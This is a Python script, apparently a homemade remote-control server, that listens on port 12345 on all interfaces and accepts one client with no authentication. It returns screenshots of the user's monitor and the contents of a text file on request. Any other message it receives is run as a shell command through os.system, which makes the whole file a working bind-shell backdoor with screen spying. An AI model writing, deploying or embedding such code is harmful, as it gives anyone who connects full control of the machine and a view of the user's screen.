import socket
import os   
import mss
import pickle
from getmac import get_mac_address
#import json

def main():
    s = socket.socket()                     

    host = "0.0.0.0"
    port = 12345
    reset = False

    s.bind((host, port))         
    s.listen(1)
    print(f"\nServer Listening on port {port}")   
    print("Server MAC Address: ", get_mac_address())

            
    (client, addr) = s.accept() 
    mac_addr = get_mac_address(ip=addr[0])
    print('\nGot connection from ', str(addr[0]) + ":" + str(addr[1]))
    print("Client MAC Address: ", mac_addr)
    print()

    while True: 
        msg = client.recv(1024).decode()
        print("Message: " + msg)
        
        # Returns the Contents of test.txt
        if msg == "return":
            with open("test.txt", "r") as f:
                client.send(f.read().encode())

        if msg == "disconnect":
            print("Recieved Disconnect Message...")
            reset = True
            break

        elif msg == "exit":
            break
        
        # Returns the data for the Users Screen
        elif msg == "screen":
            sct = mss.mss()
            monitor = sct.monitors[1]
            frame = sct.grab(monitor)
            serialized = pickle.dumps((frame.width, frame.height, frame.rgb))
            #print(serialized)

            client.send(str(len(serialized)).encode())
            client.send(serialized)


        else:
            os.system(msg)
    
    s.close()

    if reset == True:
        main()

            


if __name__ == "__main__":
    main()